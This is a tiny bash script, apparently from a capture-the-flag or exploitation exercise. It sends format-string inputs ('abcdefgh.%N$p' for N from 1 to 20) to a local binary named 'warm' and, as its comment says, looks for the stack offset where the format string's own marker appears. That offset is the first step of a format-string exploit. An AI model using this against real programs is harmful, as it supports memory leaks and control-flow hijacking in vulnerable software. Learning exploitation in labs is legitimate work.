#!/bin/bash
for i in {1..20}; do echo $i; echo $(python -c "print 'abcdefgh.%$i\$p'") | ./warm; echo; done;
#script finds offset if format string points to abcdefgh
